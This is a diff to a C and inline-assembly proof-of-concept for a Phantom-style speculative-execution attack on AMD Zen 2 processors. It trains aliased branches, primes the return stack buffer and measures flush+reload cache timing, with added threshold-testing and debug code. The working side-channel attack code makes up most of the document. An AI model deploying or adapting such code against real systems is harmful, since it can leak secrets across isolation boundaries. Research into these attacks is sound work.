@@ -8,20 +8,20 @@
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 
+// Random Address for RB_PTR
 #define RB_PTR         0x13370000
+// Stride of 12 for 4096 byte alignment
 #define RB_STRIDE_BITS 12
 #define RB_STRIDE      (0x1UL << RB_STRIDE_BITS)
+
+// 32 entries
 #define RB_SLOTS       0x20
+// but only 31 RSB
 #define RSB_SIZE       31
 
-#ifdef BOGUS
-#define PTRN 0x111000000000UL
-#elif defined(ZEN2)
 #define PTRN 0x100100000000UL // Zen 2
-#else
-#define PTRN 0x20100000000UL // Zen(+)
-#endif
 
+// Random address of Phantom Call
 #define PHANTOM_CALL        0x40000000UL
 #define CALL_FN_TRAIN_ALIAS (PHANTOM_CALL ^ PTRN)
 
@@ -30,6 +30,11 @@
 #define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE)
 #define PROT_RW    (PROT_READ | PROT_WRITE)
 #define PROT_RWX   (PROT_RW | PROT_EXEC)
+
+
+// Determine value of threshold
+#define THRESHOLD 200
+
 
 // Keeping track of RB hits after an issues return (return 1 - 31)
 __attribute__((aligned(4096))) static uint64_t results1[RB_SLOTS] = {0};
@@ -92,6 +97,23 @@ static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
     return (hi << 32) | lo;
 }
 
+static inline __attribute__((always_inline)) void test_cache_timing(uint32_t ptr){
+    asm("lfence");
+    asm("mfence");
+
+    unsigned volatile char *p = (uint8_t*) ptr;
+    uint64_t t0 = rdtsc();
+    *(volatile unsigned char *) p;
+    uint64_t dt = rdtscp() - t0;
+
+    asm("lfence");
+    asm("mfence");
+
+    printf("dt: %d\n", dt);
+
+}
+
+
 static inline __attribute__((always_inline)) void reload_range(long base, long stride,
                                                                int n, uint64_t *results) {
     asm("lfence");
@@ -127,15 +149,20 @@ static inline __attribute__((always_inline)) void flush_range(long start, long s
     asm("mfence");
 }
 
+    
+//"mov " xstr((RB_PTR + (RSB_SIZE * RB_STRIDE))) ", %r8\n\t"
+
 void leak();
 void leak_end();
 asm(".align 0x1000\n\t"
-    "leak:\n\t" NOPS_str(3) // These NOPs are confused for a CALL and push to RSB!
-    "mov " xstr((RB_PTR +
-                 (RSB_SIZE * RB_STRIDE))) ", %r8\n\t"
-                                          "lfence\n\t"
-                                          "mfence\n\t" NOPS_str(2000) "jmp *%r10\n\t"
-                                                                      "leak_end:\n\t");
+    "leak:\n\t" 
+    NOPS_str(3) // These NOPs are confused for a CALL and push to RSB!
+    "nop\n\t"
+    "lfence\n\t"
+    "mfence\n\t" 
+    NOPS_str(2000)
+    "jmp *%r10\n\t"
+    "leak_end:\n\t");
 
 void phantom_jump_insert();
 
@@ -145,6 +172,34 @@ int main(int argc, char *argv[]) {
              0) == MAP_FAILED) {
         err(1, "rb");
     }
+
+    uint64_t *results_arr[RSB_SIZE] = {
+        results1,  results2,  results3,  results4,  results5,  results6,  results7,
+        results8,  results9,  results10, results11, results12, results13, results14,
+        results15, results16, results17, results18, results19, results20, results21,
+        results22, results23, results24, results25, results26, results27, results28,
+        results29, results30, results31};
+
+    for (int k = 0; k < RSB_SIZE; k++) {
+        uint64_t *res = results_arr[k];
+        for (int i = 0; i < RSB_SIZE + 1; i++) {
+            res[i] = 0;
+        }
+    }
+
+
+    //**********************************************
+    // TEST FOR THE THRESHOLD 
+    // USE results_arr 
+
+    __asm__ volatile("clflushopt (%0)\n" ::"r"(results_arr[0]));
+    test_cache_timing(results_arr[0]);
+
+    __asm__ volatile("clflushopt (%0)\n" ::"r"(results_arr[0]));
+    results_arr[0][0] = 0;
+    test_cache_timing(results_arr[0]);
+
+    // remove when done with threshold testing
 
     uint64_t jmp_fn_train_alias = (uint64_t) phantom_jump_insert ^ PTRN;
 
@@ -163,24 +218,18 @@ int main(int argc, char *argv[]) {
         err(1, "CALL_FN_TRAIN_ALIAS");
     }
 
-    uint64_t *results_arr[RSB_SIZE] = {
-        results1,  results2,  results3,  results4,  results5,  results6,  results7,
-        results8,  results9,  results10, results11, results12, results13, results14,
-        results15, results16, results17, results18, results19, results20, results21,
-        results22, results23, results24, results25, results26, results27, results28,
-        results29, results30, results31};
-
-    for (int k = 0; k < RSB_SIZE; k++) {
-        uint64_t *res = results_arr[k];
-        for (int i = 0; i < RSB_SIZE + 1; i++) {
-            res[i] = 0;
-        }
-    }
-
+    // Move the leak to PHANTOM_CALL
     memcpy((void *) PHANTOM_CALL, leak, leak_end - leak);
+
     *(uint32_t *) CALL_FN_TRAIN_ALIAS = 0x00d0ff41; // call *%r8
     *(uint32_t *) jmp_fn_train_alias = 0x00e0ff41;  // jmp *%r8
-
+    
+    
+    printf("Address of PHANTOM_CALL:        0x%16llx\n", PHANTOM_CALL);
+    printf("Address of CALL_FN_TRAIN_ALIAS: 0x%16llx\n", CALL_FN_TRAIN_ALIAS);
+    printf("Address of PHANTOM_JMP:         0x%16llx\n", phantom_jump_insert);
+    printf("Address of JMP_FN_TRAIN_ALIAS:  0x%16llx\n", jmp_fn_train_alias);
+    
     for (int i = 0; i < ROUNDS; i++) {
         // Inserting PhantomJMP
         // clang-format off
@@ -196,8 +245,8 @@ int main(int argc, char *argv[]) {
             "mov $" xstr(CALL_FN_TRAIN_ALIAS) ", %%r9\n\t"
             "jmp *%%r9\n\t"
             "1: pop %%r9\n\t" ::: "r8", "r9", "r10");
-        
-	// Priming RSB state
+
+        // Priming RSB state
         asm(".secret=0\n\t"
             ".rept " xstr(RSB_SIZE) "\n\t"
             "call 4f\n\t"
@@ -208,21 +257,9 @@ int main(int argc, char *argv[]) {
             "4: pop %%r9\n\t"
             ".secret=.secret+1\n\t"
             ".endr\n\t" ::: "r8", "r9");
-        
-	
-	// PhantomJMP will be triggered
+
+        // PhantomJMP will be triggered
         asm(
-            NOPS_str(512)
-            "jmp a\n\t"
-            NOPS_str(512)
-            "a:\n\t"
-            NOPS_str(512)
-            "jmp b\n\t"
-            NOPS_str(512)
-            "b:\n\t"
-            NOPS_str(512)
-            "jmp phantom_jump_insert\n\t"
-            NOPS_str(512)
             "phantom_jump_insert:\n\t"
             NOPS_str(512)
         );
@@ -267,6 +304,7 @@ int main(int argc, char *argv[]) {
     }
 
     printf("\n");
-
+    
     return 0;
 }
+
